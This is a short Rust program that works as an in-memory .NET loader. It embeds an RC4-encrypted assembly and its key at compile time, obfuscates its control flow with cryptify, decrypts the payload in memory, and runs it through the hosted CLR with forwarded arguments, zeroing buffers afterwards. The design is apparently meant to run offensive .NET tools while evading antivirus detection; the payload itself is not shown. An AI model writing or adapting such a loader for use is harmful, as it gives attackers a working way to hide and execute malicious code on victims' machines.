use crypto::symmetriccipher::SynchronousStreamCipher;
use rustclr::{RuntimeVersion, RustClr};
use zeroize::Zeroize;

fn main() -> Result<(), Box<dyn std::error::Error>> {
    // Collect Arguments
    let mut _args: Vec<String> = std::env::args().collect();
    _args.drain(0..1);
    let args = _args.iter().map(AsRef::as_ref).collect();

    cryptify::flow_stmt!();
    // Decrypt the payload
    let buffer = include_bytes!("encr");
    let mut cipher = crypto::rc4::Rc4::new(include_bytes!("../keyfile"));
    let mut o = buffer.clone();
    cipher.process(&buffer[..], &mut o);
    // Zero Buffer
    buffer.zeroize();

    cryptify::flow_stmt!();
    // Run the dotnet exe
    let output = RustClr::new(&o)?
        .with_runtime_version(RuntimeVersion::V4)
        .with_output_redirection(true)
        .with_args(args)
        .run()?;
    println!("{}", output);
    // Zero Buffer
    o.zeroize();

    Ok(())
}